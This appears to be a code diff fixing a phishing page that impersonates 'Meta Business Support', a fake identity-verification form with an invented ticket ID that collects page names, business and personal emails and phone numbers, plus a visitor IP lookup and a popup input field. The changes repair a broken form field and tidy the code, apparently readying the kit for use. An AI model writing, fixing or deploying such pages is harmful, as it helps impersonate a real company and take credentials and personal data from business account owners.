@@ -4,10 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Meta Business Support - Verify Identity</title>
-
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
-
   <style>
     :root {
       --primary: #1877f2;
@@ -20,13 +18,11 @@
       --radius: 12px;
       --transition: all 0.2s ease;
     }
-
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
       background: #f5f6f8;
@@ -36,7 +32,6 @@
       display: flex;
       flex-direction: column;
     }
-
     /* === HEADER === */
     .header {
       background: white;
@@ -50,20 +45,17 @@
       z-index: 100;
       box-shadow: 0 1px 2px rgba(0,0,0,0.05);
     }
-
     .logo {
       font-weight: 700;
       font-size: 20px;
       color: var(--primary);
       text-decoration: none;
     }
-
     .search-bar {
       flex: 1;
       max-width: 500px;
       margin: 0 16px;
     }
-
     .search-bar input {
       width: 100%;
       padding: 10px 16px;
@@ -74,17 +66,14 @@
       outline: none;
       transition: var(--transition);
     }
-
     .search-bar input:focus {
       border-color: var(--primary);
       background: white;
     }
-
     .lang {
       font-size: 14px;
       color: var(--gray);
     }
-
     .hamburger {
       display: none;
       font-size: 20px;
@@ -93,11 +82,9 @@
       border-radius: 8px;
       transition: var(--transition);
     }
-
     .hamburger:hover {
       background: var(--light-gray);
     }
-
     /* === DRAWER MENU (MOBILE) === */
     .drawer-overlay {
       position: fixed;
@@ -108,12 +95,10 @@
       visibility: hidden;
       transition: var(--transition);
     }
-
     .drawer-overlay.show {
       opacity: 1;
       visibility: visible;
     }
-
     .drawer {
       position: fixed;
       top: 0;
@@ -127,11 +112,9 @@
       transition: left 0.3s ease;
       overflow-y: auto;
     }
-
     .drawer.show {
       left: 0;
     }
-
     .drawer-header {
       display: flex;
       justify-content: space-between;
@@ -140,12 +123,10 @@
       padding-bottom: 12px;
       border-bottom: 1px solid var(--border);
     }
-
     .drawer-header h3 {
       font-size: 18px;
       font-weight: 600;
     }
-
     .close-drawer {
       font-size: 24px;
       cursor: pointer;
@@ -153,11 +134,9 @@
       border-radius: 50%;
       transition: var(--transition);
     }
-
     .close-drawer:hover {
       background: var(--light-gray);
     }
-
     .drawer a {
       display: block;
       padding: 10px 12px;
@@ -167,14 +146,12 @@
       font-size: 15px;
       transition: var(--transition);
     }
-
     .drawer a:hover,
     .drawer a.active {
       background: var(--light-gray);
       color: var(--primary);
       font-weight: 500;
     }
-
     /* === SIDEBAR (DESKTOP) === */
     .sidebar {
       width: 260px;
@@ -183,14 +160,12 @@
       border-right: 1px solid var(--border);
       display: none;
     }
-
     .sidebar h3 {
       font-size: 16px;
       font-weight: 600;
       margin-bottom: 16px;
       color: #1c1e21;
     }
-
     .sidebar a {
       display: block;
       padding: 8px 12px;
@@ -200,26 +175,22 @@
       font-size: 14px;
       transition: var(--transition);
     }
-
     .sidebar a:hover,
     .sidebar a.active {
       background: var(--light-gray);
       color: var(--primary);
       font-weight: 500;
     }
-
     /* === MAIN CONTENT === */
     .main-content {
       flex: 1;
       display: flex;
     }
-
     .content-area {
       flex: 1;
       padding: 24px 16px;
       background: #f5f6f8;
     }
-
     .form-container {
       background: white;
       max-width: 720px;
@@ -228,24 +199,20 @@
       border-radius: var(--radius);
       box-shadow: var(--shadow);
     }
-
     .form-header {
       text-align: center;
       margin-bottom: 28px;
     }
-
     .form-header h2 {
       font-size: 24px;
       font-weight: 600;
       color: #1c1e21;
       margin-bottom: 8px;
     }
-
     .form-header p {
       color: var(--gray);
       font-size: 15px;
     }
-
     .ticket-info {
       background: #e7f3ff;
       padding: 12px 16px;
@@ -256,11 +223,9 @@
       margin-bottom: 24px;
       text-align: center;
     }
-
     .form-group {
       margin-bottom: 20px;
     }
-
     .form-group label {
       display: block;
       font-size: 14px;
@@ -268,11 +233,9 @@
       margin-bottom: 6px;
       font-weight: 500;
     }
-
     .form-group label .required {
       color: var(--danger);
     }
-
     .form-group input,
     .form-group textarea {
       width: 100%;
@@ -282,41 +245,34 @@
       font-size: 15px;
       transition: var(--transition);
     }
-
     .form-group input:focus,
     .form-group textarea:focus {
       outline: none;
       border-color: var(--primary);
       box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
     }
-
     .form-group textarea {
       min-height: 110px;
       resize: vertical;
     }
-
     .note {
       font-size: 13px;
       color: var(--gray);
       margin-top: 6px;
       font-style: italic;
     }
-
     .terms {
       font-size: 13px;
       color: var(--gray);
       margin: 24px 0;
     }
-
     .terms a {
       color: var(--primary);
       text-decoration: none;
     }
-
     .terms a:hover {
       text-decoration: underline;
     }
-
     .submit-btn {
       background: var(--primary);
       color: white;
@@ -330,13 +286,11 @@
       transition: var(--transition);
       box-shadow: 0 2px 4px rgba(24, 119, 242, 0.2);
     }
-
     .submit-btn:hover {
       background: var(--primary-dark);
       transform: translateY(-1px);
       box-shadow: 0 4px 8px rgba(24, 119, 242, 0.3);
     }
-
     /* === FOOTER === */
     .footer {
       background: #fafafa;
@@ -346,11 +300,9 @@
       color: #8d949e;
       border-top: 1px solid var(--border);
     }
-
     .footer strong {
       color: #1c1e21;
     }
-
     /* === POPUP === */
     .popup-overlay {
       position: fixed;
@@ -364,12 +316,10 @@
       visibility: hidden;
       transition: var(--transition);
     }
-
     .popup-overlay.show {
       opacity: 1;
       visibility: visible;
     }
-
     .popup-content {
       background: white;
       width: 90%;
@@ -381,23 +331,19 @@
       transform: scale(0.9);
       transition: transform 0.3s ease;
     }
-
     .popup-overlay.show .popup-content {
       transform: scale(1);
     }
-
     .popup-content h3 {
       font-size: 20px;
       margin-bottom: 12px;
       color: #1c1e21;
     }
-
     .popup-content p {
       color: var(--gray);
       font-size: 14px;
       margin-bottom: 20px;
     }
-
     .popup-content input {
       width: 100%;
       padding: 12px 14px;
@@ -406,12 +352,10 @@
       font-size: 16px;
       margin-bottom: 12px;
     }
-
     .popup-content input:focus {
       border-color: var(--primary);
       outline: none;
     }
-
     .error-message {
       color: var(--danger);
       font-size: 13px;
@@ -419,7 +363,6 @@
       margin: -8px 0 12px;
       display: none;
     }
-
     .popup-content button {
       background: var(--primary);
       color: white;
@@ -430,11 +373,9 @@
       cursor: pointer;
       width: 100%;
     }
-
     .popup-content button:hover {
       background: var(--primary-dark);
     }
-
     /* === RESPONSIVE === */
     @media (max-width: 768px) {
       .hamburger { display: block; }
@@ -443,7 +384,6 @@
       .main-content { flex-direction: column; }
       .sidebar { display: none !important; }
     }
-
     @media (min-width: 769px) {
       .hamburger, .drawer, .drawer-overlay { display: none !important; }
       .sidebar { display: block; }
@@ -451,7 +391,6 @@
   </style>
 </head>
 <body>
-
   <!-- Header -->
   <header class="header">
     <div class="hamburger" id="hamburger">Menu</div>
@@ -497,43 +436,36 @@
           <h2>Verify Your Identity</h2>
           <p>Please provide the required information to restore your account access.</p>
         </div>
-
         <div class="ticket-info">
           Ticket ID: <span id="ticketNumber"></span>
         </div>
-
         <form id="verifyForm">
           <div class="form-group">
             <label for="pageName">Page Name <span class="required">*</span></label>
             <input type="text" id="pageName" required />
           </div>
-
           <div class="form-group">
             <label for="businessEmail">Business Email <span class="required">*</span></label>
             <input type="email" id="businessEmail" required />
             <p class="note">We'll send verification updates to this email.</p>
           </div>
-
           <div class="form-group">
             <label for="personalEmail">Personal Email <span class="required">*</span></label>
             <input type="email" id="personalEmail" required />
           </div>
-
           <div class="form-group">
             <label for="phone">Mobile Phone Number <span class="required">*</span></label>
-            <input type="text" id "phone" required />
+            <!-- ĐÃ SỬA: id="phone" -->
+            <input type="text" id="phone" required />
             <p class="note">We may contact you via SMS for verification.</p>
           </div>
-
           <div class="form-group">
             <label for="additionalInfo">Additional Information (Optional)</label>
             <textarea id="additionalInfo" placeholder="Provide details to help us review your case..."></textarea>
           </div>
-
           <p class="terms">
             By submitting, you agree to our <a href="#">Terms</a> and <a href="#">Community Standards</a>.
           </p>
-
           <button type="submit" class="submit-btn">Submit Verification</button>
         </form>
       </div>
@@ -634,7 +566,10 @@
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      if (!form.checkValidity()) return alert('Please fill all required fields.');
+      if (!form.checkValidity()) {
+        alert('Please fill all required fields.');
+        return;
+      }
 
       formData = {
         pageName: document.getElementById('pageName').value,
@@ -685,7 +620,7 @@
 
     // === INIT ===
     document.addEventListener('DOMContentLoaded', () => {
-      ticketSpan.textContent = generateTicketID(); // TKT-A7X9K2P8
+      ticketSpan.textContent = generateTicketID();
       fetchIP();
     });
   </script>
